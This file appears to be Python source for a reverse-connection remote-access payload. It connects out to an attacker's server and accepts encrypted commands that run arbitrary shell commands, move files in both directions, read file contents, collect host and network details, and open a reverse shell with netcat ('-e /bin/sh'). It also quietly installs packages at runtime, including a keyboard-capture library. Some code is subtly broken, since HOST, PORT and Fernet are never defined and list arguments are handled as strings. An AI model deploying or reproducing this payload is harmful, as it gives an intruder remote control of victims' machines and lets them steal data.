# Reverse Socket TCP Payload
import os
import platform
import time
import json
import ssl
import importlib
import subprocess as sp
import socket
# list of the modules you have to install manually
imports = ["requests", "keyboard"]
try:
    for i in imports:
        globals()[i] = importlib.import_module(i)
except:
    for i in imports:
        sp.call(["pip3", "install", i])
    for i in imports:
        globals()[i] = importlib.import_module(i)
fernet = ""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def decrypt(data):
    return fernet.decrypt(data).decode()


def encrypt(data):
    return fernet.encrypt(data.encode())


while True:
    try:
        #cert = ssl.get_server_certificate((HOST, PORT), ssl_version=ssl.PROTOCOL_TLS_CLIENT)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
    except socket.error as e:
        print(e)
        time.sleep(1)
        continue
    print("Connected to Server")
    key = s.recv(1024)
    fernet = Fernet(key)
    s.send(encrypt(platform.system()))
    while True:
        try:
            data = decrypt(s.recv(1024))
        except KeyboardInterrupt:
            s.close()
            exit(0) 
        except:
            break
        data= data.split(":")
        option = data[0]
        args = data[1:]
        option = option.lower()
        if option == "cmd":
            s.send(encrypt(sp.getoutput(args)))
        elif option == "check":
            s.send(encrypt("1"))
        elif option == "file-u":
            try:
                file = s.recv(1024)
                with open(args.split("|")[1], "wb") as f:
                    f.write(file)
                s.send(encrypt("File Uploaded"))
            except Exception as e:
                s.send(encrypt("!" + str(e)))
        elif option == "file-d":
            try:
                with open(args, "rb") as f:
                    s.sendfile(f)
            except Exception as e:
                s.send(encrypt("!" + str(e)))
        elif option == "content":
            try:
                with open(args) as f:
                    s.send(encrypt(f.read()))
            except Exception as e:
                s.send(encrypt("!" + str(e)))
        elif option == "infos":
            # Get System Infos
            infos = {}
            infos["hostname"] = sp.getoutput("hostname")
            try:
                infos["remote_ip"] = requests.get(
                    "https://api.ipify.org").text
            except Exception as e:
                infos["remote_ip"] = e
            infos["local_ip"] = socket.gethostbyname(socket.gethostname())
            infos["operating_system"] = sp.getoutput("uname -a")
            infos["user"] = sp.getoutput("whoami")
            infos["python_version"] = sp.getoutput("python3 -V")
            infos["date"] = sp.getoutput("date")
            infos["firewall"] = sp.getoutput("ufw status")
            infos["sudo"] = sp.getoutput("sudo -V")
            infos["services"] = sp.getoutput("ss -tulpn")
            s.send(encrypt(json.dumps(infos)))
        elif option == "dir":
            # Get Directory
            try:
                os.listdir(args)
                s.send(encrypt(str(os.listdir())))
            except Exception as e:
                s.send(encrypt("!" + str(e)))
        elif option == "exit":
            # clear everything
            exit()
        elif option == "shell":
            # open a shell
            sp.Popen(["nc", args[0], args[1], "-e /bin/sh"])
            s.send(encrypt("Shell Opened"))
